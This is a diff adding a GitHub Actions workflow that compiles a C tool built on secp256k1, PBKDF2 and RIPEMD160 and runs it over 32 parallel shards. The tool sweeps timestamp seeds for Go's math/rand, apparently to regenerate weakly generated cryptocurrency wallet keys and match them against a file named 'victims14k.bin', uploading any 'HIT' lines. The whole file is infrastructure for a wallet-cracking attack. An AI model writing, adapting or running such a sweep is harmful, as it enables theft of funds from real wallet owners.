@@ -1,0 +1,60 @@
+name: ill-bloom-sweep-go
+
+on:
+  workflow_dispatch:
+
+jobs:
+  sweep:
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      matrix:
+        shard: [0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31]
+
+    steps:
+    - uses: actions/checkout@v4
+
+    - name: Install deps
+      run: |
+        sudo apt-get update -qq
+        sudo apt-get install -y libssl-dev libsecp256k1-dev gcc
+
+    - name: Compile sweephit_wp2 (Go math/rand + word-picking)
+      run: |
+        gcc -O3 -o sweephit_wp2 sweephit_wp.c \
+          pbkdf2.c hmac.c sha2.c sha3.c ripemd160.c memzero.c \
+          -lssl -lcrypto -lsecp256k1
+        echo "compiled OK"
+
+    - name: Compute shard range
+      id: range
+      run: |
+        SHARD=${{ matrix.shard }}
+        TOTAL=32
+        START=1515038489
+        END=1785600000
+        STEP=$(( (END - START + TOTAL - 1) / TOTAL ))
+        SHARD_START=$(( START + SHARD * STEP ))
+        SHARD_END=$(( SHARD_START + STEP ))
+        if [ $SHARD_END -gt $END ]; then SHARD_END=$END; fi
+        echo "shard_start=$SHARD_START" >> $GITHUB_OUTPUT
+        echo "shard_end=$SHARD_END" >> $GITHUB_OUTPUT
+
+    - name: Run Go schemes 40-42
+      timeout-minutes: 300
+      run: |
+        for SCH in 40 41 42; do
+          ./sweephit_wp2 $SCH ${{ steps.range.outputs.shard_start }} ${{ steps.range.outputs.shard_end }} victims14k.bin \
+            >> hits_shard_${{ matrix.shard }}.txt 2>/dev/null || true
+        done
+        HITS=$(grep -c "^HIT" hits_shard_${{ matrix.shard }}.txt 2>/dev/null || echo 0)
+        echo "Shard ${{ matrix.shard }}: $HITS hits"
+        cat hits_shard_${{ matrix.shard }}.txt || true
+
+    - name: Upload hits
+      if: always()
+      uses: actions/upload-artifact@v4
+      with:
+        name: go-hits-shard-${{ matrix.shard }}
+        path: hits_shard_${{ matrix.shard }}.txt
+        retention-days: 7
